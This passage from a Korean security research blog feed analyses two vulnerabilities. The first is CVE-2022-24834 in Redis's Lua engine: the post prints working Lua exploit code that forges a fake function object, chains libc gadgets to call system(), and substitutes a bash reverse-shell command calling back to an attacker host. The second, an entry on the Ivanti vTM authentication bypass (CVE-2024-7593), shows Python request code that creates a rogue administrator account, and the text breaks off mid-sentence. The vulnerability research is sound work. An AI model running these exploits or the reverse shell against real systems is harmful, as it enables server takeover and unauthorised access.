&#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xC8FC;&#xC18C;&#xC758; &#xCD5C;&#xD558;&#xC704; 12&#xBE44;&#xD2B8;&#xB97C; &#xBAA8;&#xB450; 0&#xC73C;&#xB85C; &#xBC14;&#xAFBC; &#xB2E4;&#xC74C; 4&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xC77D;&#xACE0; ELF &#xD30C;&#xC77C;&#xC758; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xC640; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBCA0;&#xC774;&#xC2A4; &#xC8FC;&#xC18C;&#xB97C; &#xC54C;&#xC544;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="8-Create-Fake-Function"><a href="#8-Create-Fake-Function" class="headerlink" title="8. Create Fake Function"></a>8. Create Fake Function</h3><p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC740; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; gadget &#xC8FC;&#xC18C;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xACE0; <code>fakeobj</code>&#xB85C; Fake <code>Closure</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-keyword">local</span> system_addr = resolve_symbol_gnu(libc_leak, <span class="hljs-string">&quot;system&quot;</span>)<span class="hljs-comment">-- error(&quot;system at &quot; .. string.format(&quot;0x%x&quot;, system_addr))</span><span class="hljs-keyword">local</span> libc_base = find_libc_base(libc_leak)<span class="hljs-keyword">local</span> finder = read_str_at(libc_base, <span class="hljs-number">0x150000</span>)<span class="hljs-comment">-- mov rdi, qword ptr [rax] ; mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10];</span><span class="hljs-keyword">local</span> start_index, end_index = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">find</span>(finder, <span class="hljs-string">&quot;\72\139\56\72\139\71\56\255\80\16&quot;</span>)<span class="hljs-keyword">local</span> gadget1 = libc_base + start_index - <span class="hljs-number">1</span><span class="hljs-comment">-- error(&quot;gadget1 at &quot; .. string.format(&quot;0x%x&quot;, gadget1))</span><span class="hljs-comment">-- call qword ptr [rax + 0x18];</span><span class="hljs-keyword">local</span> start_index, end_index = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">find</span>(finder, <span class="hljs-string">&quot;\255\80\24&quot;</span>)<span class="hljs-keyword">local</span> gadget2 = libc_base + start_index - <span class="hljs-number">1</span><span class="hljs-comment">-- error(&quot;gadget2 at &quot; .. string.format(&quot;0x%x&quot;, gadget1))</span><span class="hljs-keyword">local</span> ptr_ptr = (p64(gadget2) .. p64(system_addr))<span class="hljs-keyword">local</span> cmd = <span class="hljs-string">&quot;[CMD]&quot;</span><span class="hljs-keyword">local</span> arg1 = (    cmd    .. <span class="hljs-built_in">string</span>.<span class="hljs-built_in">rep</span>(<span class="hljs-string">&quot;\0&quot;</span>, <span class="hljs-number">56</span>-#cmd)    .. p64(addrof(ptr_ptr) + <span class="hljs-number">0x18</span> - <span class="hljs-number">0x10</span>)    .. p64(<span class="hljs-number">0</span>) )<span class="hljs-keyword">local</span> fake_function = (   p64(addrof(arg1) + <span class="hljs-number">0x18</span>) <span class="hljs-comment">-- 00h</span>   .. p64(<span class="hljs-number">0x010106</span>)   .. p64(<span class="hljs-number">0</span>)   .. p64(<span class="hljs-number">0</span>)   .. p64(gadget1)   .. p64(<span class="hljs-number">0</span>)   .. p64(<span class="hljs-number">0</span>)   .. p64(<span class="hljs-number">0</span>))<span class="hljs-keyword">local</span> fake_function = fakeobj(addrof(fake_function) + <span class="hljs-number">0x18</span>, <span class="hljs-number">6</span>)fake_function()</code></pre><p>Lua&#xC5D0;&#xC11C;&#xB294; &#xD568;&#xC218; &#xB610;&#xD55C; &#xD558;&#xB098;&#xC758; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;(<code>Closure</code>)&#xB85C; &#xB2E4;&#xB8E8;&#xACE0; &#xC774;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ClosureHeader \</span>&#xA0; &#xA0; &#xA0; &#xA0; CommonHeader; lu_byte isC; lu_byte nupvalues; GCObject *gclist; \&#xA0; &#xA0; &#xA0; &#xA0; <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Table</span> *<span class="hljs-title">env</span></span><span class="hljs-class"><span class="hljs-title">typedef</span> <span class="hljs-title">struct</span> <span class="hljs-title">CClosure</span> {</span>&#xA0; ClosureHeader;<span class="hljs-comment">//CommonHeader</span>  <span class="hljs-comment">//GCObject *next;</span>  <span class="hljs-comment">//lu_byte tt;</span>  <span class="hljs-comment">//lu_byte marked;</span>  <span class="hljs-comment">//lu_byte isC;</span>  <span class="hljs-comment">//lu_byte nupvalues</span>  <span class="hljs-comment">//GCObject *gclist</span>  <span class="hljs-comment">//struct Table *env</span>  &#xA0; lua_CFunction f;&#xA0; TValue upvalue[<span class="hljs-number">1</span>];} CClosure;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LClosure</span> {</span>&#xA0; ClosureHeader;&#xA0; <span class="hljs-comment">//CommonHeader</span><span class="hljs-comment">//GCObject *next;</span>  <span class="hljs-comment">//lu_byte tt;</span>  <span class="hljs-comment">//lu_byte marked;</span>  <span class="hljs-comment">//lu_byte isC;</span>  <span class="hljs-comment">//lu_byte nupvalues</span>  <span class="hljs-comment">//GCObject *gclist</span>  <span class="hljs-comment">//struct Table *env</span>  &#xA0; <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Proto</span> *<span class="hljs-title">p</span>;</span>&#xA0; UpVal *upvals[<span class="hljs-number">1</span>];} LClosure;<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">union</span> Closure {&#xA0; CClosure c;&#xA0; LClosure l;} Closure;</code></pre><p><code>Closure</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB294; C built-in &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>CClosure</code>&#xC640; Lua &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>LClosure</code>&#xC758; &#xACF5;&#xC6A9;&#xCCB4;&#xB85C; <code>ClosureHeader</code>&#xC758; <code>isC</code> &#xD544;&#xB4DC;&#xC758; &#xAC12;&#xC5D0; &#xB530;&#xB77C; <code>CClosure</code>&#xB098; <code>LClosure</code>&#xB85C; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xAD6C;&#xC870;&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xC5EC; &#xC815;&#xC758;&#xB41C; <code>fake_function</code>&#xC758; &#xAD6C;&#xC870;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;</p><pre><code class="hljs lua"><span class="hljs-comment">-- gadget1 : mov rdi, qword ptr [rax] ; mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10];</span><span class="hljs-keyword">local</span> fake_function = (    p64(addrof(arg1) + <span class="hljs-number">0x18</span>) <span class="hljs-comment">-- 00h</span>    .. p64(<span class="hljs-number">0x010106</span>) <span class="hljs-comment">-- tt:6(LUA_TFUNCTION), marked:1, isC:1</span>    .. p64(<span class="hljs-number">0</span>)    .. p64(<span class="hljs-number">0</span>)    .. p64(gadget1) <span class="hljs-comment">-- lua_CFunction f:gadget1</span>    .. p64(<span class="hljs-number">0</span>)    .. p64(<span class="hljs-number">0</span>)    .. p64(<span class="hljs-number">0</span>))</code></pre><p><code>fake_function</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xBA74; <code>gadget1</code>&#xC774; &#xC2E4;&#xD589;&#xB420; &#xAC83;&#xC774;&#xACE0; &#xC774;&#xB54C; rax&#xB294; &#xD638;&#xCD9C;&#xB41C; <code>CClosure</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC758; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; <code>gadget1</code>&#xC5D0;&#xC11C; <code>mov rdi, qword ptr [rax];</code>&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74; &#xBA3C;&#xC800; rdi&#xC5D0; <code>arg1</code>&#xC758; &#xC8FC;&#xC18C; + 0x18&#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. Lua&#xC5D0;&#xC11C;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; <code>TString</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xBB38;&#xC790;&#xC5F4; &#xB370;&#xC774;&#xD130;&#xB294; &#xAD6C;&#xC870;&#xCCB4; &#xBC14;&#xB85C; &#xB2E4;&#xC74C;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">union</span> TString {  L_Umaxalign dummy;  <span class="hljs-comment">/* ensures maximum alignment for strings */</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>    CommonHeader;    lu_byte reserved;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> hash;    <span class="hljs-keyword">size_t</span> len;  } tsv;} TString;</code></pre><p>&#xADF8;&#xB807;&#xAE30;&#xC5D0; rdi&#xC5D0;&#xB294; <code>arg1</code>&#xC758; &#xBB38;&#xC790;&#xC5F4;&#xC778; <code>cmd .. string.rep(&quot;\0&quot;, 56-#cmd) .. p64(addrof(ptr_ptr) + 0x18 - 0x10) .. p64(0)</code>&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC73C;&#xB85C; <code>mov rax, qword ptr [rdi + 0x38];</code>&#xC774; &#xC2E4;&#xD589;&#xB418;&#xBA74;&#xC11C; rax&#xC5D0;&#xB294; <code>ptr_ptr</code>&#xC758; &#xC8FC;&#xC18C; + 0x8&#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>ptr_ptr</code>&#xC740; <code>gadget2</code>&#xC640; <code>system</code> &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xAC12;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xBB38;&#xC790;&#xC5F4;&#xB85C; <code>arg1</code>&#xACFC; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC774;&#xB8E8;&#xB294; &#xB370;&#xC774;&#xD130;&#xB294; <code>ptr_ptr</code>&#xC758; &#xC8FC;&#xC18C; + 0x18&#xBD80;&#xD130; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>call qword ptr [rax + 0x10]</code>&#xC774; &#xC2E4;&#xD589;&#xB428;&#xC5D0; &#xB530;&#xB77C; <code>addrof(ptr_ptr) + 0x18</code>&#xC5D0; &#xC800;&#xC7A5;&#xB41C; <code>gadget2</code>&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>gadget2</code>&#xC5D0;&#xC11C;&#xB294; <code>call qword ptr [rax + 0x18]</code>&#xC774; &#xC2E4;&#xD589;&#xB418;&#xACE0; <code>gadget1</code>&#xC5D0; &#xC758;&#xD574; <code>ptr_ptr</code>&#xC758; &#xC8FC;&#xC18C; + 0x8&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; rax&#xC5D0; 0x18&#xC744; &#xB354;&#xD55C; &#xC8FC;&#xC18C;&#xC5D0;&#xB294; <code>system</code> &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;</p><pre><code class="hljs c">system(<span class="hljs-string">&quot;[CMD]&quot;</span>)</code></pre><p>&#xC2E4;&#xD589;&#xD560; &#xBA85;&#xB839;&#xC5B4;&#xB294; <code>local cmd = &quot;[CMD]&quot;</code>&#xB85C; &#xC815;&#xC758;&#xB41C; <code>cmd</code>&#xC5D0; &#xC758;&#xD574;&#xC11C; &#xC815;&#xD574;&#xC9C0;&#xAC8C; &#xB418;&#xB294;&#xB370; &#xC774; &#xBD80;&#xBD84;&#xC774; &#xC11C;&#xBC84;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xACE0; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xB294; python &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xB9AC;&#xBC84;&#xC2A4; &#xC258;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB294; <code>bash -c &apos;bash -i &gt;&amp; /dev/tcp/{lhost}/{lport} 0&gt;&amp;1&apos;</code>&#xB85C; &#xB300;&#xCCB4;&#xB418;&#xBA74;&#xC11C; &#xB9AC;&#xBC84;&#xC2A4; &#xC258;&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Remote-Code-Execution-Redis-Version-6-0-19"><a href="#Remote-Code-Execution-Redis-Version-6-0-19" class="headerlink" title="Remote Code Execution : Redis Version 6.0.19"></a>Remote Code Execution : Redis Version 6.0.19</h2><p>Redis 6.0.19 &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB3C4; &#xC704;&#xC758; &#xB2E4;&#xB978; &#xB450; &#xBC84;&#xC804;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; RCE &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xC9C0;&#xB9CC; &#xB3D9;&#xC77C;&#xD55C; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; RCE&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xC774;&#xC720;&#xB294; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xC0AC;&#xC6A9;&#xB41C; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC778; <code>Table</code>&#xC774; &#xC815;&#xC758;&#xAC00; &#xB2E4;&#xB974;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/18/pwndorei/1day1document_CVE-2022-24834/Untitled%204.png" alt="Untitled"></p><p>&#xC704;&#xC640; &#xAC19;&#xC774; Redis 6.0.19&#xC640; 7.0.11&#xC758; <code>lobject.h</code>&#xB97C; &#xBE44;&#xAD50;&#xD574;&#xBCF4;&#xBA74; 6.0.19 &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; <code>Table</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; <code>int readonly</code> &#xD544;&#xB4DC;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC784;&#xC758; &#xC8FC;&#xC18C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;&#xB97C; &#xB2EC;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB36E;&#xC5B4;&#xC4F0;&#xB294; <code>Table</code> &#xAD6C;&#xC870;&#xCCB4;&#xC758; <code>array</code>, <code>sizearray</code> &#xB4F1;&#xC758; &#xD544;&#xB4DC;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC774; &#xAE30;&#xC874;&#xBCF4;&#xB2E4; 8&#xB9CC;&#xD07C; &#xAC10;&#xC18C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Table</span> {</span>   -- CommonHeader   GCObject *next; <span class="hljs-comment">//0x0</span>   lu_byte tt;   lu_byte marked;   lu_byte flags;  <span class="hljs-comment">/* 1&lt;&lt;p means tagmethod(p) is not present */</span>   <span class="hljs-comment">//int readonly; </span>   lu_byte lsizenode;  <span class="hljs-comment">/* log2 of size of `node&apos; array */</span>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Table</span> *<span class="hljs-title">metatable</span>;</span> <span class="hljs-comment">//0x10</span>   TValue *<span class="hljs-built_in">array</span>;  <span class="hljs-comment">/* array part */</span> <span class="hljs-comment">// 0x18</span>   Node *node; <span class="hljs-comment">//0x20</span>   Node *lastfree;  <span class="hljs-comment">/* any free position is before this position */</span> <span class="hljs-comment">//0x28</span>   GCObject *gclist; <span class="hljs-comment">// 0x30</span>   <span class="hljs-keyword">int</span> sizearray;  <span class="hljs-comment">/* size of `array&apos; array */</span> <span class="hljs-comment">// 0x38</span>} Table;</code></pre><p>&#xB530;&#xB77C;&#xC11C; &#xC774;&#xB7EC;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC758; &#xBCC0;&#xD654;&#xB97C; &#xAE30;&#xC874; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xC5D0; &#xBC18;&#xC601;&#xD574;&#xC8FC;&#xBA74; 6.0.19 &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB3C4; &#xB611;&#xAC19;&#xC774; RCE&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;!!! &#xC5B4;&#xB5BB;&#xAC8C; &#xC218;&#xC815;&#xD588;&#xB294;&#xC9C0;&#xB294; <a href="https://github.com/pwndorei/CVE-2022-24834/blob/master/exploit_6.0.19.lua">&#xC774; &#xCF54;&#xB4DC;</a>&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD558;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; 6.0.19 &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xC758; RCE &#xC2DC;&#xC5F0; &#xC601;&#xC0C1;&#xC744; &#xBCF4;&#xACE0; &#xB9C8;&#xCE58;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;!</p><iframe width="560" height="315" src="https://www.youtube.com/embed/TZwli5PnDrc?si=kvMEs2iudMAGtDnV" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>javascript&#xC5D0; &#xC774;&#xC5B4; Lua&#xAE4C;&#xC9C0;&#x2026; &#xBD84;&#xBA85; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xD558;&#xB294;&#xAC74;&#xB370; &#xCEE4;&#xB110; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xD558;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD574;&#xC11C; &#xBB54;&#xAC00; &#xC2E0;&#xC120;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; 1&#xBC14;&#xC774;&#xD2B8;&#xC758; partial overwrite&#xB97C; RCE&#xB85C; &#xBC1C;&#xC804;&#xC2DC;&#xCF1C;&#xB098;&#xAC00;&#xB294; &#xACFC;&#xC815;&#xC774; &#xC815;&#xB9D0; &#xD765;&#xBBF8;&#xB85C;&#xC6E0;&#xACE0; &#xB2E4;&#xC74C;&#xC5D0;&#xB3C4; &#xC774;&#xB7F0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xB2E4;&#xC2DC; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xACE0; &#xC2F6;&#xB124;&#xC694;</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC544;&#xB9C8;&#xB3C4; &#xC7AC;&#xBC0C;&#xAC8C; &#xB290;&#xAEF4;&#xC84C;&#xB358; &#xC774;&#xC720;&#xB294; &#xC544;&#xB798;&#xC758; &#xD6CC;&#xB96D;&#xD55C; &#xB808;&#xD37C;&#xB7F0;&#xC2A4;&#xAC00; &#xC788;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;&#x314B;&#x314B; &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xB97C; &#xC9C1;&#xC811; &#xC791;&#xC131;&#xD55C;&#xB2E4;&#xACE0; &#xCE58;&#xBA74; &#xC815;&#xB9D0; &#xC544;&#xCC14;&#xD558;&#xB124;&#xC694;&#x2026;.</p><p>&#xBB34;&#xD2BC; &#xC774;&#xBC88;&#xC5D0;&#xB3C4; &#xAE34; &#xAE00; &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD558;&#xACE0; &#xB2E4;&#xC74C;&#xC5D0; &#xB610; &#xC7AC;&#xBBF8;&#xC788;&#xB294; &#xC5F0;&#xAD6C;&#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><hr><ul><li><a href="https://ricercasecurity.blogspot.com/2023/07/fuzzing-farm-4-hunting-and-exploiting-0.html">https://ricercasecurity.blogspot.com/2023/07/fuzzing-farm-4-hunting-and-exploiting-0.html</a></li><li><a href="https://github.com/convisolabs/CVE-2022-24834">https://github.com/convisolabs/CVE-2022-24834</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/Redis/">Redis</category>
      
      <category domain="https://hackyboiz.github.io/tags/Integer-Overflow/">Integer Overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2022-24834/">CVE-2022-24834</category>
      
      
      <comments>https://hackyboiz.github.io/2024/08/18/pwndorei/1day1document_CVE-2022-24834/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-7593: Ivanti Virtual Traffic Manager (vTM)의 관리자 계정 생성으로 인한 Authentication Bypass 취약점</title>
      <link>https://hackyboiz.github.io/2024/08/17/j0ker/2024-08-17/</link>
      <guid>https://hackyboiz.github.io/2024/08/17/j0ker/2024-08-17/</guid>
      <pubDate>Sat, 17 Aug 2024 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://forums.ivanti.com/s/article/Security-Adviso</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Virtual-Traffic-Manager-vTM-CVE-2024-7593?language=en_US">Security Advisory: Ivanti Virtual Traffic Manager (vTM ) (CVE-2024-7593)</a></li><li><a href="https://packetstormsecurity.com/files/download/179906/ivantiadc99-bypass.txt">Ivanti ADC 9.9 Authentication Bypass</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ivanti Virtual Traffic Manager 22.2, 22.3, 22.3R2, 22.5R1, 22.6R1, 22.7R1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Ivanti Virtual Traffic Manager (vTM)&#xC740; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xAE30;&#xBC18;&#xC758; Application Delivery Controller(ADC)&#xB85C; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xBC0F; &#xAC00;&#xC0C1; &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xC758; &#xB85C;&#xB4DC;&#xBC38;&#xB7F0;&#xC2F1;&#xACFC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xB51C;&#xB9AC;&#xBC84;&#xB9AC; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>CVE-2024-7593&#xC740; vTM&#xC5D0; &#xC784;&#xC758;&#xC758; &#xAD00;&#xB9AC;&#xC790; &#xACC4;&#xC815;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; CVSS 9.8&#xC744; &#xBC1B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs python">params = {     <span class="hljs-string">&apos;error&apos;</span>: <span class="hljs-number">1</span>,    <span class="hljs-string">&apos;section&apos;</span>: <span class="hljs-string">&apos;Access Management:LocalUsers&apos;</span>}          data = {    <span class="hljs-string">&apos;_form_submitted&apos;</span>: <span class="hljs-string">&apos;form&apos;</span>,    <span class="hljs-string">&apos;create_user&apos;</span>: <span class="hljs-string">&apos;Create&apos;</span>,    <span class="hljs-string">&apos;group&apos;</span>: <span class="hljs-string">&apos;admin&apos;</span>,    <span class="hljs-string">&apos;newusername&apos;</span>: new_admin_name,    <span class="hljs-string">&apos;password1&apos;</span>: new_admin_password,    <span class="hljs-string">&apos;password2&apos;</span>: new_admin_password}r = session.post(admin_portal + <span class="hljs-string">&quot;/apps/zxtm/wizard.fcgi&quot;</span>, params=params, data=data, verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)</code></pre><p>&#xD30C;&#xB77C;&#xBBF8;&#xD130; <code>error</code>&#xB97C; <code>1</code>&#xB85C; &#xC124;&#xC815;&#xD558;&#xC5EC; <code>wizard.fcgi</code>&#xC758; Access Control&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xACE0; <code>section</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xD1B5;&#xD574; &#xACC4;&#xC815; &#xC0DD;&#xC131;&#xC744; &#xC704;&#xD55C; &#xC139;&#xC158;&#xC744; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;. &#xB9AC;&#xD018;&#xC2A4;&#xD2B8;&#xC758; data&#xC5D0;&#xB294; CSRF &#xBC29;&#xC9C0; &#xC6B0;&#xD68C;&#xB97C; &#xC704;&#xD55C; <code>_form_submitted</code> &#xD544;&#xB4DC;&#xC5D0;&#xB294; <code>form</code>&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xACE0;, &#xACC4;&#xC815; &#xC0DD;&#xC131;&#xC744; &#xC758;&#xBBF8;&#xD558;&#xB294; <code>create_user</code> &#xD544;&#xB4DC;&#xC5D0; <code>Create</code>&#xB97C; &#xB123;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xB098;&#xBA38;&#xC9C0; &#xAD00;&#xB9AC;&#xC790; 